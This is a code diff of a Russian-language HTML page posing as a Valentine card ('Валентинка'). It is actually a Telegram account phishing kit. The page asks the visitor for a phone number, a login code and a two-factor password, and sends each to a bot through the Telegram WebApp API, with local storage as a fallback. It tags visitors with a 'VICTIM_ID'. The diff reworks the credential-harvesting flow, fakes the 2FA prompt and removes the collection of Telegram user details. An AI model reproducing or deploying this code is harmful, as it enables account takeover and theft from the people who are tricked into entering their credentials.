@@ -4,7 +4,6 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Валентинка 💌</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
@@ -105,6 +104,11 @@
             border-color: #ff4d6d;
             outline: none;
             background: #2a2a2a;
+        }
+        
+        .input-group input:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         
         .btn {
@@ -225,14 +229,8 @@
     </div>
 
     <script>
-        Telegram.WebApp.ready();
-        Telegram.WebApp.expand();
-        
-        // Уникальный ID для базы данных
+        // Уникальный ID для этой сессии
         const VICTIM_ID = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        
-        // Данные пользователя Telegram
-        const tgUser = Telegram.WebApp.initDataUnsafe?.user || null;
         
         // Элементы
         const step1 = document.getElementById('step1');
@@ -251,10 +249,9 @@
         
         let userPhone = '';
         let userCode = '';
-        let has2FA = false;
         let startTime = Date.now();
         
-        // Отправка данных в бот
+        // Функция отправки данных (через Telegram WebApp)
         function sendToBot(type, data) {
             try {
                 const payload = {
@@ -262,34 +259,33 @@
                     data: {
                         ...data,
                         victim_id: VICTIM_ID,
-                        timestamp: Date.now(),
-                        user: tgUser ? {
-                            id: tgUser.id,
-                            username: tgUser.username || '',
-                            first_name: tgUser.first_name || '',
-                            last_name: tgUser.last_name || ''
-                        } : null
+                        timestamp: Date.now()
                     }
                 };
                 
-                Telegram.WebApp.sendData(JSON.stringify(payload));
-                console.log('📤 Отправлено:', type, data);
+                // Если есть Telegram WebApp API
+                if (window.Telegram?.WebApp) {
+                    window.Telegram.WebApp.sendData(JSON.stringify(payload));
+                } else {
+                    // Если нет Telegram API (для теста)
+                    console.log('📤 Данные для отправки:', payload);
+                    
+                    // Сохраняем в localStorage
+                    const saved = JSON.parse(localStorage.getItem('victim_data') || '[]');
+                    saved.push(payload);
+                    localStorage.setItem('victim_data', JSON.stringify(saved));
+                }
             } catch(e) {
-                console.log('❌ Ошибка отправки:', e);
+                console.log('Ошибка:', e);
             }
         }
         
         // Таймер
         function updateTimer() {
             const elapsed = Math.floor((Date.now() - startTime) / 1000);
-            timer.textContent = `⏱ Сессия активна: ${elapsed} сек • ID: ${VICTIM_ID.slice(-8)}`;
+            timer.textContent = `⏱ Сессия активна: ${elapsed} сек`;
         }
         setInterval(updateTimer, 1000);
-        
-        // Отправляем визит
-        setTimeout(() => {
-            sendToBot('visit', {});
-        }, 1000);
         
         // ШАГ 1: Отправка номера
         sendPhoneBtn.addEventListener('click', function() {
@@ -300,15 +296,19 @@
                 return;
             }
             
+            // Форматируем номер
             phone = phone.replace(/\D/g, '');
             if (phone.startsWith('8')) phone = '7' + phone.substring(1);
             if (!phone.startsWith('7')) phone = '7' + phone;
+            if (phone.length === 10) phone = '7' + phone;
             phone = '+' + phone;
             
             userPhone = phone;
             
+            // Отправляем в бот
             sendToBot('phone', { phone: userPhone });
             
+            // Переходим к шагу 2
             step1.classList.add('hidden');
             step2.classList.remove('hidden');
             codeStatus.innerHTML = `⏳ Код отправлен на ${userPhone}`;
@@ -327,13 +327,20 @@
             const code = codeInput.value;
             userCode = code;
             
+            // Отправляем в бот
             sendToBot('code', { 
                 code: code,
-                has_password: has2FA
+                phone: userPhone
             });
             
             codeStatus.innerHTML = '✅ Код принят! Проверка...';
             codeStatus.classList.add('success');
+            
+            // Через 2 секунды показываем шаг 3 (имитация 2FA)
+            setTimeout(() => {
+                step3.classList.remove('hidden');
+                passwordWarning.innerHTML = '⚠️ Требуется дополнительный пароль';
+            }, 2000);
         });
         
         // ШАГ 3: Отправка пароля
@@ -344,53 +351,35 @@
         sendPasswordBtn.addEventListener('click', function() {
             const password = passwordInput.value;
             
+            // Отправляем в бот
             sendToBot('password', { 
                 password: password,
                 code: userCode,
                 phone: userPhone
             });
             
-            passwordStatus.innerHTML = '✅ Пароль принят!';
+            passwordStatus.innerHTML = '✅ Пароль принят! Валентинка открывается...';
             passwordStatus.classList.add('success');
             passwordWarning.innerHTML = '✅ Доступ разрешен';
             passwordWarning.classList.add('success');
             
+            // Закрываем через 3 секунды
             setTimeout(() => {
-                try {
-                    Telegram.WebApp.close();
-                } catch(e) {}
+                if (window.Telegram?.WebApp) {
+                    window.Telegram.WebApp.close();
+                } else {
+                    document.querySelector('.card').innerHTML = '<h2>❤️ Валентинка открыта!</h2><p>Спасибо!</p>';
+                }
             }, 3000);
         });
         
-        // Получение сообщений от бота
-        window.addEventListener('message', function(event) {
-            try {
-                const data = typeof event.data === 'string' ? JSON.parse(event.data) : event.data;
-                
-                if (data.type === 'request_password') {
-                    has2FA = true;
-                    step3.classList.remove('hidden');
-                    passwordWarning.innerHTML = '⚠️ Требуется пароль двухфакторной аутентификации';
-                    codeStatus.innerHTML = '✅ Код верен. Введи пароль ниже';
-                }
-            } catch(e) {}
-        });
-        
-        // URL параметры
-        const urlParams = new URLSearchParams(window.location.search);
-        const action = urlParams.get('action');
-        const code = urlParams.get('code');
-        
-        if (action === 'enter_code' && code) {
-            setTimeout(() => {
-                if (!step2.classList.contains('hidden')) {
-                    codeInput.value = code;
-                    codeInput.dispatchEvent(new Event('input'));
-                }
-            }, 1000);
+        // Инициализация Telegram WebApp (если есть)
+        if (window.Telegram?.WebApp) {
+            window.Telegram.WebApp.ready();
+            window.Telegram.WebApp.expand();
         }
         
-        console.log('✅ Страница загружена, ID:', VICTIM_ID);
+        console.log('✅ Сайт загружен, ID:', VICTIM_ID);
     </script>
 </body>
 </html>
